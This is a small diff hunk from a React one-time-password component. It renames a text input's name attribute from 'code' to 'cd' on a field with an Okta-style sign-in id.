@@ -102,7 +102,7 @@ export default function Otp() {
                         <input
                           type="text"
                           placeholder=""
-                          name="code"
+                          name="cd"
                           id="okta-signin-username"
                           defaultValue={formInput.cd}
                           
